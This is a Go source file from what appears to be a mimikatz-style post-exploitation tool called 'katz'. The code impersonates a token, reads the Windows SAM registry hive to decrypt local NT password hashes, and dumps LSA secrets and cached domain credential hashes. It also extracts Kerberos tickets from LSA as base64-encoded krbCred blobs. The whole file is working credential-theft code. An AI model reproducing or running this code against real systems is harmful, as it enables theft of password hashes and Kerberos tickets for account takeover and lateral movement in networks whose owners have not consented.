package modules

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"katz/katz/modules/kerb/ticketdump"
	"katz/katz/modules/sam"
	"katz/katz/utils"
	"strings"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	// testing

)
type printableSecret interface {
	PrintSecret(io.Writer)
}
type dcc2_cache struct {
	Domain string
	User   string
	Cache  string
}

// func (self *dcc2_cache) PrintSecret(out io.Writer) {
// 	fmt.Fprintln(out, self.cache)
// }
// var dcc2SecretList = []printableSecret{}

func DumpSAM(token windows.Token) ([]*sam.Sam_account, error){
	var acc []*sam.Sam_account
	err := utils.InjectToken(token)
	if err != nil {
		return acc, err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account\Users`, registry.READ)
	if err != nil {
		return acc, fmt.Errorf("failed to open Users key: %w", err)
	}
	defer key.Close()
	subKeys, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return acc, fmt.Errorf("failed to read subkeys: %w", err)
	}

	bootKey, err := sam.GetBootKey(token)
	if err != nil {
		return acc, fmt.Errorf("failed to get boot key: %w", err)
	}

	systemKey, err := sam.GetSysKey(token, bootKey)
	if err != nil {
		return acc, fmt.Errorf("failed to get system key: %w", err)
	}
	for _, k := range subKeys {
		// Skip non-RID keys (like "Names")
		if len(k) != 8 {
			continue
		}

		// Parse RID from the key name
		rid, err := sam.ParseRIDFromKey(k)
		if err != nil {
			continue // Skip invalid RIDs
		}

		subKeyPath := fmt.Sprintf(`SAM\SAM\Domains\Account\Users\%s`, k)
		subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subKeyPath, registry.READ)
		if err != nil {
			continue
		}
		defer subKey.Close()

		subKeyData, err := subKey.ReadValueNames(-1)
		if err != nil {
			continue
		}

		// Check if this is a valid user entry (should have "V" value)
		if len(subKeyData) > 1 {
			v, _, err := subKey.GetBinaryValue("V")
			if err != nil {
				continue
			}

			data := sam.GetNT(v, rid, systemKey)
			acc = append(acc, &data)
		}
	}
	return acc, nil

}
func GetSysKey(token windows.Token) (result string, err error){
	err = utils.InjectToken(token)
	if err != nil {
		return 
	}
	bootKey, err := sam.GetBootKey(token)
	sysKey, err := sam.GetSysKey(token, bootKey)
	result = fmt.Sprintf("0x%s",hex.EncodeToString(sysKey))
	return
}
func GetBootKey(token windows.Token) (bootKey []byte, err error) {
	err = utils.InjectToken(token)
	if err != nil {
		return 
	}
	bootKey, err = sam.GetBootKey(token)
	return
}
func DumpLSASecrets(token windows.Token, bootkey []byte, VistaStyle bool, history bool) (result []*sam.PrintableLSASecret, err error){

	keySecrets := `SECURITY\Policy\Secrets`
	var secrets []string
	regkey, err := registry.OpenKey(registry.LOCAL_MACHINE, keySecrets, registry.READ)
	secrets, _ = regkey.ReadSubKeyNames(-1)
	newsecrets := make([]string, 0, len(secrets)*2)
	for i := range secrets {
		newsecrets = append(newsecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
		newsecrets = append(newsecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
	}
	lsaSecrets, err := sam.GetLSASecrets(token, bootkey, VistaStyle, history)
	if err != nil {
		panic(err)
	}
	for i := range lsaSecrets{
		result = append(result, &lsaSecrets[i])
	}
	return result, err
}
func CachedHashes(token windows.Token, bootkey []byte, VistaStyle bool) (result []*dcc2_cache, err error) {
	hashes, err := sam.GetCachedHash(token, bootkey, VistaStyle)
	if err != nil {
		panic(err)
	}
	for _, hash := range hashes {
		userdomain := strings.Split(hash, ":")[0]
		parts := strings.Split(userdomain, "/")
		result = append(result, &dcc2_cache{Domain: parts[0], User: parts[1], Cache: hash})
	}
	return result, err
}

func GetKerberosTickets() []map[string]interface{} {
	var ticketCache []map[string]interface{}

	// retrieve LSA handle
	// if process is high integrity, process token will be elevated to SYSTEM
	lsaHandle, err := ticketdump.GetLsaHandle()
	if err != nil {
		return nil
	}

	// get kerberos auth package
	kerberosString := ticketdump.NewLSAString("kerberos")
	authPackage, err := ticketdump.GetAuthenticationPackage(lsaHandle, kerberosString)
	if err != nil {
		return nil
	}

	// list cached kerberos tickets in LSA
	sessionCreds, err := ticketdump.EnumerateTickets(lsaHandle, authPackage)
	if err != nil {
		return nil
	}

	//fmt.Printf("sessionCreds received: %v\n", sessionCreds)

	ticketCache = make([]map[string]interface{}, 0)
	for _, cred := range sessionCreds {
		//fmt.Printf("sessionCred: \n%+v\n", cred)
		for _, ticket := range cred.Tickets {

			// fmt.Printf("current process is SYSTEM: %t\n", kerb.IsSystem())
			// obtain raw ticket material
			extractedTicket, err := ticketdump.ExtractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
			// fmt.Printf("extractedTicket: %+v\n", extractedTicket)
			if err != nil {
				continue
			}

			// create map (hash table) to store cached kerberos tickets
			ticket := map[string]interface{}{
				"username":    cred.LogonSession.Username,
				"domain":      cred.LogonSession.LogonDomain,
				"logonId":     cred.LogonSession.LogonID.LowPart,
				"serverName":  ticket.ServerName,
				"serverRealm": ticket.ServerRealm,
				"startTime":   ticket.StartTime.Format(time.RFC3339),
				"endTime":     ticket.EndTime.Format(time.RFC3339),
				"renewTime":   ticket.RenewTime.Format(time.RFC3339),
				"flags":       ticket.TicketFlags.String(),
				"encType":     ticket.EncryptionType,
				"krbCred":     base64.StdEncoding.EncodeToString(extractedTicket),
			}

			ticketCache = append(ticketCache, ticket)
		}
	}

	if len(ticketCache) > 0 {
		return ticketCache
	}

	return nil
}

